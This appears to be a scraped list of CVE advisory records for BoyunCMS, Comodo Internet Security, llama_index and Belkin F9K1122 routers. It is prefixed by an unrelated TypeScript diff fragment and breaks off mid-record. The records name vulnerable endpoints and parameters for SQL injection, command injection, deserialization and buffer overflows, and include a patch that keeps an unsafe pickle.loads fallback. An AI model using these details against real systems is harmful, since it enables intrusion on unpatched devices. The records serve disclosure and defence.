-        const systemMessages = messages.filter((msg) => msg.role === 'system')
-
-        if (systemMessages.length > 1) {
-          logger.warn(
-            `Found ${systemMessages.length} system messages in memories with no explicit systemPrompt. Consider providing an explicit systemPrompt for consistent behavior.`
-          )
-        } else if (systemMessages.length === 1) {
-          logger.info('Using system message from memories')
-        }
-      }
+  private processMemories(memories: any): Message[] {
+    if (!memories) return []
 
-      if (inputs.userPrompt) {
-        let userContent = inputs.userPrompt
-        if (typeof userContent === 'object' && userContent.input) {
-          userContent = userContent.input
-        } else if (typeof userContent === 'object') {
-          userContent = JSON.stringify(userContent)
-        }
+    let memoryArray: any[] = []
+    if (memories?.response?.memories && Array.isArray(memories.response.memories)) {
+      memoryArray = memories.response.memories
+    } else if (
... [truncated]

================================================================================


CVE ID: CVE-2025-7102
Published: 2025-07-07T01:15:23.637
Modified: 2025-09-15T17:37:02.953
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in BoyunCMS up to 1.4.20. It has been declared as critical. This vulnerability affects unknown code of the file application/update/controller/Server.php. The manipulation of the argument phone leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://note-hxlab.wetolink.com/share/sEjaSsXWRNz1 [Broken Link]
  2. https://vuldb.com/?ctiid.315016 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315016 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604401 [Third Party Advisory, VDB Entry]
  5. https://note-hxlab.wetolink.com/share/sEjaSsXWRNz1 [Broken Link]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315016 ---
phone

================================================================================


CVE ID: CVE-2025-7101
Published: 2025-07-07T01:15:23.450
Modified: 2025-09-15T17:37:26.577
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')

Description:
A vulnerability was found in BoyunCMS up to 1.4.20. It has been classified as critical. This affects an unknown part of the file /install/install_ok.php of the component Configuration File Handler. The manipulation of the argument db_pass leads to code injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://note-hxlab.wetolink.com/share/6wemW8CnOMbu [Broken Link]
  2. https://vuldb.com/?ctiid.315015 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315015 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604323 [Third Party Advisory, VDB Entry]
  5. https://note-hxlab.wetolink.com/share/6wemW8CnOMbu [Broken Link]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315015 ---
db_pass

================================================================================


CVE ID: CVE-2025-7100
Published: 2025-07-07T01:15:22.633
Modified: 2025-09-15T17:37:34.360
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284
  - CWE-434: Unrestricted Upload of File with Dangerous Type
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
A vulnerability was found in BoyunCMS up to 1.4.20 and classified as critical. Affected by this issue is some unknown functionality of the file /application/user/controller/Index.php. The manipulation of the argument image leads to unrestricted upload. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://note-hxlab.wetolink.com/share/KLjaD7oBzCSp [Broken Link]
  2. https://vuldb.com/?ctiid.315014 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315014 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604455 [Third Party Advisory, VDB Entry]
  5. https://note-hxlab.wetolink.com/share/KLjaD7oBzCSp [Broken Link]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315014 ---
image

================================================================================


CVE ID: CVE-2025-7099
Published: 2025-07-07T00:15:22.513
Modified: 2025-09-15T17:37:45.007
CVSS Score: 5.6 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-20: Improper Input Validation
  - CWE-502: Deserialization of Untrusted Data
  - CWE-502: Deserialization of Untrusted Data

Description:
A vulnerability has been found in BoyunCMS up to 1.21 on PHP7 and classified as critical. Affected by this vulnerability is an unknown functionality of the file install/install2.php of the component Installation Handler. The manipulation of the argument db_host leads to deserialization. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://note-hxlab.wetolink.com/share/cQGEOmctNARD [Broken Link]
  2. https://vuldb.com/?ctiid.315013 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315013 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604310 [Third Party Advisory, VDB Entry]
  5. https://note-hxlab.wetolink.com/share/cQGEOmctNARD [Broken Link]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315013 ---
db_host

================================================================================


CVE ID: CVE-2025-7098
Published: 2025-07-06T23:15:22.143
Modified: 2025-07-17T20:28:59.497
CVSS Score: 5.6 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability, which was classified as critical, was found in Comodo Internet Security Premium 12.3.4.8162. Affected is an unknown function of the component File Name Handler. The manipulation of the argument name/folder leads to path traversal. It is possible to launch the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://drive.google.com/file/d/1qnWarYsTSc5_sV6o8ULv0LBvGfKKXPxn/view?usp=sharing [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315012 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315012 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603715 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603716 [Third Party Advisory, VDB Entry]
  6. https://drive.google.com/file/d/1qnWarYsTSc5_sV6o8ULv0LBvGfKKXPxn/view [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315012 ---
name/folder

================================================================================


CVE ID: CVE-2025-7097
Published: 2025-07-06T23:15:21.960
Modified: 2025-07-18T15:11:10.033
CVSS Score: 8.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability, which was classified as critical, has been found in Comodo Internet Security Premium 12.3.4.8162. This issue affects some unknown processing of the file cis_update_x64.xml of the component Manifest File Handler. The manipulation of the argument binary/params leads to os command injection. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://drive.google.com/file/d/1qnWarYsTSc5_sV6o8ULv0LBvGfKKXPxn/view?usp=sharing [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315011 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.315011 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603714 [Third Party Advisory, VDB Entry]
  5. https://drive.google.com/file/d/1qnWarYsTSc5_sV6o8ULv0LBvGfKKXPxn/view [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315011 ---
binary/params

================================================================================


CVE ID: CVE-2025-3108
Published: 2025-07-06T23:15:21.777
Modified: 2025-07-30T21:29:05.780
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-1112: CWE-1112

Description:
A critical deserialization vulnerability exists in the run-llama/llama_index library's JsonPickleSerializer component, affecting versions v0.12.27 through v0.12.40. This vulnerability allows remote code execution due to an insecure fallback to Python's pickle module. JsonPickleSerializer prioritizes deserialization using pickle.loads(), which can execute arbitrary code when processing untrusted data. Attackers can exploit this by crafting malicious payloads to achieve full system compromise. The root cause includes an insecure fallback mechanism, lack of validation or safeguards, misleading design, and violation of Python security guidelines.

References (2):
  1. https://github.com/run-llama/llama_index/commit/702e4340623092fac4cf2fe95eb9465034856da3 [Patch]
  2. https://huntr.com/bounties/9b55a5e8-74e6-4241-b323-e360dc8b110a [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/run-llama/llama_index/commit/702e4340623092fac4cf2fe95eb9465034856da3 ---
From 702e4340623092fac4cf2fe95eb9465034856da3 Mon Sep 17 00:00:00 2001
From: "Clelia (Astra) Bertelli" <133636879+AstraBert@users.noreply.github.com>
Date: Tue, 3 Jun 2025 23:48:37 +0200
Subject: [PATCH] Adding warning in the docstring of JsonPickleSerializer for
 the user to deserialize only safe things (#18943)

* adding warning in the docstring of JsonPickleSerializer for the user to deserialize only safe things

* renaming to PickleSerializer
---
 .../llama_index/core/workflow/context_serializers.py  | 11 +++++++++--
 llama-index-core/tests/workflow/test_workflow.py      |  6 +++---
 2 files changed, 12 insertions(+), 5 deletions(-)

diff --git a/llama-index-core/llama_index/core/workflow/context_serializers.py b/llama-index-core/llama_index/core/workflow/context_serializers.py
index 8ec496a8da..c824a54fc0 100644
--- a/llama-index-core/llama_index/core/workflow/context_serializers.py
+++ b/llama-index-core/llama_index/core/workflow/context_serializers.py
@@ -64,7 +64,7 @@ def deserialize(self, value: str) -> Any:
         return self._deserialize_value(data)
 
 
-class JsonPickleSerializer(JsonSerializer):
+class PickleSerializer(JsonSerializer):
     def serialize(self, value: Any) -> str:
         """Serialize while prioritizing JSON, falling back to Pickle."""
         try:
@@ -73,8 +73,15 @@ def serialize(self, value: Any) -> str:
             return base64.b64encode(pickle.dumps(value)).decode("utf-8")
 
     def deserialize(self, value: str) -> Any:
-        """Deserialize while prioritizing Pickle, falling back to JSON."""
+        """
+        Deserialize while prioritizing Pickle, falling back to JSON.
+        To avoid malicious exploits of the deserialization, deserialize objects
+        only when you deem it safe to do so.
+        """
         try:
             return pickle.loads(base64.b64decode(value))
         except Exception:
             return super().deserialize(value)
+
+
+JsonPickleSerializer = PickleSerializer
diff --git a/llama-index-core/tests/workflow/test_workflow.py b/llama-index-core/tests/workflow/test_workflow.py
index 8fa31bb9bc..721faf024c 100644
--- a/llama-index-core/tests/workflow/test_workflow.py
+++ b/llama-index-core/tests/workflow/test_workflow.py
@@ -8,7 +8,7 @@
 import pytest
 from llama_index.core import MockEmbedding
 from llama_index.core.llms.mock import MockLLM
-from llama_index.core.workflow.context_serializers import JsonPickleSerializer
+from llama_index.core.workflow.context_serializers import PickleSerializer
 from llama_index.core.workflow.decorators import step
 from llama_index.core.workflow.events import (
     Event,
@@ -534,9 +534,9 @@ async def step(self, ctx: Context, ev: StartEvent) -> StopEvent:
         state_dict = handler.ctx.to_dict()
 
     # if we allow pickle, then we can pickle the LLM/embedding object
-    state_dict = handler.ctx.to_dict(serializer=JsonPickleSerializer())
+    state_dict = handler.ctx.to_dict(serializer=PickleSerializer())
     new_handler = WorkflowHandler(
-        ctx=Context.from_dict(wf, state_dict, serializer=JsonPickleSerializer())
+        ctx=Context.from_dict(wf, state_dict, serializer=PickleSerializer())
     )
     assert new_handler.ctx
 


================================================================================


CVE ID: CVE-2025-7094
Published: 2025-07-06T21:15:21.727
Modified: 2025-07-09T17:25:10.133
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability was found in Belkin F9K1122 1.00.33. It has been rated as critical. Affected by this issue is the function formBSSetSitesurvey of the file /goform/formBSSetSitesurvey of the component webs. The manipulation of the argument submit-url-ok leads to stack-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_14/14.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_14/14.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.315008 [Permissions Required]
  4. https://vuldb.com/?id.315008 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603711 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_14/14.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315008 ---
formBSSetSitesurvey

formBSSetSitesurvey

submit-url-ok

================================================================================


CVE ID: CVE-2025-7093
Published: 2025-07-06T21:15:20.830
Modified: 2025-07-09T17:25:18.967
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability was found in Belkin F9K1122 1.00.33. It has been declared as critical. Affected by this vulnerability is the function formSetLanguage of the file /goform/formSetLanguage of the component webs. The manipulation of the argument webpage leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_13/13.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_13/13.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.315007 [Permissions Required]
  4. https://vuldb.com/?id.315007 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603710 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_13/13.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315007 ---
formSetLanguage

formSetLanguage

webpage

================================================================================


CVE ID: CVE-2025-7092
Published: 2025-07-06T20:15:24.000
Modified: 2025-07-09T17:25:27.817
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability has been found in Belkin F9K1122 1.00.33 and classified as critical. This vulnerability affects the function formWlanSetupWPS of the file /goform/formWlanSetupWPS of the component webs. The manipulation of the argument wps_enrolee_pin/webpage leads to stack-based buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_12/12.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_12/12.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.315004 [Permissions Required]
  4. https://vuldb.com/?id.315004 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603701 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_12/12.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315004 ---
formWlanSetupWPS

formWlanSetupWPS

wps_enrolee_pin/webpage

================================================================================


CVE ID: CVE-2025-7091
Published: 2025-07-06T20:15:23.800
Modified: 2025-07-09T17:25:38.590
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability was found in Belkin F9K1122 1.00.33. It has been classified as critical. Affected is the function formWlanMP of the file /goform/formWlanMP of the component webs. The manipulation of the argument ateFunc/ateGain/ateTxCount/ateChan/ateRate/ateMacID/e2pTxPower1/e2pTxPower2/e2pTxPower3/e2pTxPower4/e2pTxPower5/e2pTxPower6/e2pTxPower7/e2pTx2Power1/e2pTx2Power2/e2pTx2Power3/e2pTx2Power4/e2pTx2Power5/e2pTx2Power6/e2pTx2Power7/ateTxFreqOffset/ateMode/ateBW/ateAntenna/e2pTxFreqOffset/e2pTxPwDeltaB/e2pTxPwDeltaG/e2pTxPwDeltaMix/e2pTxPwDeltaN/readE2P leads to stack-based buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_11/11.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_11/11.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.315006 [Permissions Required]
  4. https://vuldb.com/?id.315006 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603700 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_11/11.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315006 ---
formWlanMP

formWlanMP

ateFunc/ateGain/ateTxCount/ateChan/ateRate/ateMacID/e2pTxPower1/e2pTxPower2/e2pTxPower3/e2pTxPower4/e2pTxPower5/e2pTxPower6/e2pTxPower7/e2pTx2Power1/e2pTx2Power2/e2pTx2Power3/e2pTx2Power4/e2pTx2Power5/e2pTx2Power6/e2pTx2Power7/ateTxFreqOffset/ateMode/ateBW/ateAntenna/e2pTxFreqOffset/e2pTxPwDeltaB/e2pTxPwDeltaG/e2pTxPwDeltaMix/e2pTxPwDeltaN/readE2P

================================================================================


CVE ID: CVE-2025-7090
Published: 2025-07-06T19:15:24.693
Modified: 2025-07-09T17:25:50.907
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability, which was classified as critical, has been found in Belkin F9K1122 1.00.33. Affected by this issue is the function formConnectionSetting of the file /goform/formConnectionSetting of the component webs. The manipulation of the argument max_Conn/timeOut leads to stack-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_10/10.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_10/10.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.315002 [Permissions Required]
  4. https://vuldb.com/?id.315002 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603699 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_10/10.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315002 ---
formConnectionSetting

formConnectionSetting

max_Conn/timeOut

================================================================================


CVE ID: CVE-2025-7089
Published: 2025-07-06T19:15:24.420
Modified: 2025-07-09T17:25:59.617
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability was found in Belkin F9K1122 1.00.33 and classified as critical. This issue affects the function formWanTcpipSetup of the file /goform/formWanTcpipSetup of the component webs. The manipulation of the argument pppUserName leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_9/9.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_9/9.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.315005 [Permissions Required]
  4. https://vuldb.com/?id.315005 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603698 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_9/9.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315005 ---
formWanTcpipSetup

formWanTcpipSetup

pppUserName

================================================================================


CVE ID: CVE-2025-7088
Published: 2025-07-06T18:15:22.683
Modified: 2025-07-09T17:26:08.560
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability, which was classified as critical, was found in Belkin F9K1122 1.00.33. This affects the function formPPPoESetup of the file /goform/formPPPoESetup of the component webs. The manipulation of the argument pppUserName leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_8/8.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_8/8.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.315003 [Permissions Required]
  4. https://vuldb.com/?id.315003 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603697 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_8/8.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315003 ---
formPPPoESetup

formPPPoESetup

pppUserName

================================================================================


CVE ID: CVE-2025-7087
Published: 2025-07-06T18:15:21.863
Modified: 2025-07-09T17:38:45.070
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability classified as critical was found in Belkin F9K1122 1.00.33. Affected by this vulnerability is the function formL2TPSetup of the file /goform/formL2TPSetup of the component webs. The manipulation of the argument L2TPUserName leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_7/7.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_7/7.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.315001 [Permissions Required]
  4. https://vuldb.com/?id.315001 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603696 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_7/7.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315001 ---
formL2TPSetup

formL2TPSetup

L2TPUserName

================================================================================


CVE ID: CVE-2025-7086
Published: 2025-07-06T17:15:24.003
Modified: 2025-07-09T17:38:54.723
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability classified as critical has been found in Belkin F9K1122 1.00.33. Affected is the function formPPTPSetup of the file /goform/formPPTPSetup of the component webs. The manipulation of the argument pptpUserName leads to stack-based buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_6/6.md [Exploit]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_6/6.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.315000 [Permissions Required]
  4. https://vuldb.com/?id.315000 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603695 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315000 ---
formPPTPSetup

formPPTPSetup

pptpUserName

================================================================================


CVE ID: CVE-2025-7085
Published: 2025-07-06T17:15:23.197
Modified: 2025-07-09T17:35:06.310
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability was found in Belkin F9K1122 1.00.33. It has been rated as critical. This issue affects the function formiNICWpsStart of the file /goform/formiNICWpsStart of the component webs. The manipulation of the argument pinCode leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_5/5.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_5/5.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314999 [Permissions Required]
  4. https://vuldb.com/?id.314999 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603694 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_5/5.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314999 ---
formiNICWpsStart

formiNICWpsStart

pinCode

================================================================================


CVE ID: CVE-2025-7084
Published: 2025-07-06T16:15:28.447
Modified: 2025-07-09T17:35:15.507
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability was found in Belkin F9K1122 1.00.33. It has been declared as critical. This vulnerability affects the function formWpsStart of the file /goform/formWpsStart of the component webs. The manipulation of the argument pinCode leads to stack-based buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_4/4.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_4/4.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314998 [Permissions Required]
  4. https://vuldb.com/?id.314998 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603674 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_4/4.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314998 ---
formWpsStart

formWpsStart

pinCode

================================================================================


CVE ID: CVE-2025-7083
Published: 2025-07-06T16:15:27.780
Modified: 2025-07-09T17:35:24.870
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability was found in Belkin F9K1122 1.00.33. It has been classified as critical. This affects the function mp of the file /goform/mp of the component webs. The manipulation of the argument command leads to os command injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_3/3.md [Exploit, Third Party Advisory]
  2. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_3/3.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314997 [Permissions Required]
  4. https://vuldb.com/?id.314997 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603673 [Third Party Advisory, VDB Entry]
  6. https://github.com/wudipjq/my_vuln/blob/main/Belkin/vuln_3/3.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314997 ---
mp

mp

command

================================================================================


CVE ID: CVE-2025-7082
Published: 2025-07-06T14:15:28.607
Modified: 2025-07-09T17:35:38.157
